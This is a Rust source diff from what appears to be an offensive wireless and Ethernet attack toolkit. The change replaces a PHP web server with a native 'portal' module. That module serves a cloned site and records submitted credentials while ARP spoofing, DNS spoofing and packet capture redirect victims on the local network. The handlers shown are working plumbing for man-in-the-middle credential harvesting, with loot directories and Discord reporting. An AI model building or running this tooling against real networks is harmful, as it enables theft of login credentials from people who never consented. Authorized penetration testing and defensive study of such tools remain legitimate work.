@@ -20,6 +20,7 @@ use rustyjack_evasion::{
     MacAddress, MacManager, MacMode, MacPolicyConfig, MacPolicyEngine, MacStage, StableScope,
     VendorPolicy,
 };
+use rustyjack_portal::{start_portal, stop_portal, PortalConfig};
 use rustyjack_wireless::{
     arp_scan, calculate_bandwidth, discover_gateway, discover_mdns_devices, get_traffic_stats,
     capture_dns_queries, scan_network_services, start_hotspot, status_hotspot, stop_hotspot,
@@ -62,9 +63,9 @@ use crate::system::{
     sanitize_label, save_wifi_profile, scan_local_hosts, scan_wifi_networks,
     select_active_uplink, select_best_interface, select_wifi_interface, send_discord_payload,
     send_scan_to_discord, set_interface_metric, spawn_arpspoof_pair, start_bridge_pair,
-    start_dns_spoof, start_pcap_capture, start_php_server, stop_arp_spoof, stop_bridge_pair,
-    stop_dns_spoof, stop_pcap_capture, write_interface_preference, write_wifi_profile, HostInfo,
-    KillResult, WifiProfile,
+    start_dns_spoof, start_pcap_capture, stop_arp_spoof, stop_bridge_pair, stop_dns_spoof,
+    stop_pcap_capture, write_interface_preference, write_wifi_profile, HostInfo, KillResult,
+    WifiProfile,
 };
 
 pub type HandlerResult = (String, Value);
@@ -1699,6 +1700,26 @@ fn is_probably_human_device(device: &DeviceInfo) -> bool {
     false
 }
 
+fn build_portal_config(
+    interface: &str,
+    listen_ip: Ipv4Addr,
+    site_dir: PathBuf,
+    capture_dir: PathBuf,
+) -> PortalConfig {
+    PortalConfig {
+        interface: interface.to_string(),
+        listen_ip,
+        listen_port: 80,
+        site_dir,
+        capture_dir,
+        max_body_bytes: 16 * 1024,
+        max_concurrency: 32,
+        request_timeout: Duration::from_secs(5),
+        dnat_mode: false,
+        bind_to_device: false,
+    }
+}
+
 fn handle_eth_site_cred_capture(root: &Path, args: EthernetSiteCredArgs) -> Result<HandlerResult> {
     let EthernetSiteCredArgs {
         interface,
@@ -1789,8 +1810,7 @@ fn handle_eth_site_cred_capture(root: &Path, args: EthernetSiteCredArgs) -> Resu
     // Clean slate
     let _ = stop_arp_spoof();
     let _ = stop_pcap_capture();
-    let _ = kill_process_pattern("php -S 0.0.0.0:80");
-    let _ = kill_process_pattern("php");
+    let _ = stop_portal();
     let _ = stop_dns_spoof();
 
     enable_ip_forwarding(true)?;
@@ -1806,7 +1826,13 @@ fn handle_eth_site_cred_capture(root: &Path, args: EthernetSiteCredArgs) -> Resu
     start_pcap_capture(&interface_info.name, &pcap_path)?;
 
     // Start DNS spoof + portal
-    start_php_server(&site_dir, Some(&dns_capture_dir))?;
+    let portal_cfg = build_portal_config(
+        &interface_info.name,
+        interface_info.address,
+        site_dir.clone(),
+        dns_capture_dir.clone(),
+    );
+    start_portal(portal_cfg)?;
     start_dns_spoof(&interface_info.name, interface_info.address, interface_info.address)?;
     let _ = log_mac_usage(
         root,
@@ -1870,7 +1896,7 @@ fn handle_dnsspoof_start(root: &Path, args: DnsSpoofStartArgs) -> Result<Handler
         bail!("Site template not found: {}", site_dir.display());
     }
 
-    let _ = kill_process_pattern("php -S 0.0.0.0:80");
+    let _ = stop_portal();
     let _ = stop_dns_spoof();
 
     let capture_dir = if let Some(dir) = loot_dir {
@@ -1883,7 +1909,13 @@ fn handle_dnsspoof_start(root: &Path, args: DnsSpoofStartArgs) -> Result<Handler
         base
     };
 
-    start_php_server(&site_dir, Some(&capture_dir))?;
+    let portal_cfg = build_portal_config(
+        &interface_info.name,
+        interface_info.address,
+        site_dir.clone(),
+        capture_dir.clone(),
+    );
+    start_portal(portal_cfg)?;
     start_dns_spoof(&interface_info.name, interface_info.address, interface_info.address)?;
     let _ = log_mac_usage(
         root,
@@ -1901,8 +1933,7 @@ fn handle_dnsspoof_start(root: &Path, args: DnsSpoofStartArgs) -> Result<Handler
 }
 
 fn handle_dnsspoof_stop() -> Result<HandlerResult> {
-    let _ = kill_process_pattern("php -S 0.0.0.0:80");
-    let _ = kill_process_pattern("php");
+    let _ = stop_portal();
     let _ = stop_dns_spoof();
     let data = json!({ "stopped": true });
     Ok(("DNS spoofing stopped".to_string(), data))
